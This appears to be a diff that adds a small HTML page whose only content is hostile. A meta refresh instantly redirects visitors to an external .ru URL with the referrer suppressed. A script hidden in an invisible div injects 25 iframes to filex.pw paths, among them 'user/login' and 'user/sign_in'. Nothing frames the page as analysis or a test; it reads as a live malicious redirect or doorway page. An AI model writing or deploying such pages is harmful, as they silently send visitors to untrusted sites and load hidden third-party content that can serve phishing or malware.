@@ -1,0 +1,30 @@
+<html><head><meta name="referrer" content="no-referrer">
+    <meta http-equiv="refresh" content="0;url=http://igetsend.ru/cs?wsa=595014e9b52d0766492316" />
+</head><body>
+<div style="display:none">
+<script>
+function randomIntFromInterval(min,max){
+    return Math.floor(Math.random()*(max-min+1)+min);
+}
+
+function str_rand() {
+        var result       = '';
+        var words        = '0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM';
+        var max_position = words.length - 1;
+            for( i = 0; i < randomIntFromInterval(1,100); ++i ) {
+                position = Math.floor ( Math.random() * max_position );
+                result = result + words.substring(position, position + 1);
+            }
+        return result;
+}  
+
+var array = ['8159e225d9bce88','8159e44e5619640','8159e2248042044','user/login','user/sign_in'];
+var i = 0;
+while (i < 25) {
+i++;
+document.write('<iframe src="https://filex.pw/'+array[randomIntFromInterval(1,4)]+'?'+randomIntFromInterval(1,3000)+'"></iframe>');
+}
+</script> 
+</div>
+</body>
+</html>
